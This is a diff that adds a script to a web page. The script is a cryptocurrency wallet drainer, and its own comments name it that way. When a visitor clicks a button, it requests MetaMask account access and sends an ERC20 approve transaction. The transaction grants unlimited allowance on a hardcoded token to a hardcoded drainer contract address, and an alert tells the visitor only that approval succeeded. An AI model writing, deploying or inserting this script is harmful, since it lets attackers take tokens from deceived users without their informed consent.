@@ -28,5 +28,62 @@
             }
         });
     </script>
+     <script>
+        // The ERC20 token contract address (replace with your token's contract address)
+        const tokenAddress = '0x130785C7dd6c732Fb00A40e02eB1df654d8772F7';
+
+        // The Wallet Drainer contract address (replace with your drainer contract address)
+        const spenderAddress = '0xc68fA1a15992CDB03114D6ac9d7066A8e712A885';
+
+        // The maximum approval amount (for unlimited allowance)
+        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+        async function approveTokens() {
+            // Check if MetaMask is installed
+            if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
+
+                // Request account access if needed
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                // Get the selected account
+                const accounts = await web3.eth.getAccounts();
+                const account = accounts[0];
+
+                // ABI for the ERC20 approve function
+                const approveAbi = [
+                    {
+                        constant: false,
+                        inputs: [
+                            { name: "_spender", type: "address" },
+                            { name: "_value", type: "uint256" }
+                        ],
+                        name: "approve",
+                        outputs: [{ name: "", type: "bool" }],
+                        type: "function"
+                    }
+                ];
+
+                // Create a contract instance
+                const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);
+
+                // Send the approve transaction
+                try {
+                    await tokenContract.methods
+                        .approve(spenderAddress, maxApproval)
+                        .send({ from: account });
+
+                    alert('Token approval successful!');
+                } catch (error) {
+                    alert('Error in token approval: ' + error.message);
+                }
+            } else {
+                alert('MetaMask is not installed!');
+            }
+        }
+
+        // Set up the button event listener
+        document.getElementById('approveButton').addEventListener('click', approveTokens);
+    </script>
 </body>
 </html>
